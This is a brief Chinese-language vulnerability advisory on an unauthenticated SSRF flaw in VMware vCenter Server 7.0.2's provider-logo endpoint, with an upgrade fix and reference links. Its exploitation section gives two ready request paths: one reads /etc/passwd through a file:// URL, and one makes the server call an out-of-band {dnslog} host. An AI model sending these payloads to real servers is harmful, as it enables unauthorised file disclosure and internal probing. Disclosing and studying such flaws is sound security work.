### 一 漏洞描述
VMware vCenter Server 是美国威睿（VMware）公司的一套服务器和虚拟化管理软件。该软件提供了一个用于管理 VMware vSphere 环境的集中式平台，可自动实施和交付虚拟基础架构。
近日(2021.12.01)，监测到一则 VMware vCenter Server 组件存在 SSRF 漏洞的信息，暂未分配漏洞编号。
该漏洞是由于 h5-vcav-bootstrap-service 组件的 getProviderLogo 函数中未对 provider-logo 参数做校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行 SSRF 攻击，最终造成服务器敏感性信息泄露等危害。

影响范围:
VMware vCenter Server 7.0.2

### 二 漏洞利用
文件读取: ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd
SSRF: ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=http://{dnslog}

### 三 漏洞修复
升级

> 参考链接
> https://bbs.huaweicloud.com/forum/forum.php?mod=viewthread&tid=172363
> https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/
> 2021.12.1 github poc: https://github.com/l0ggg/VMware_vCenter

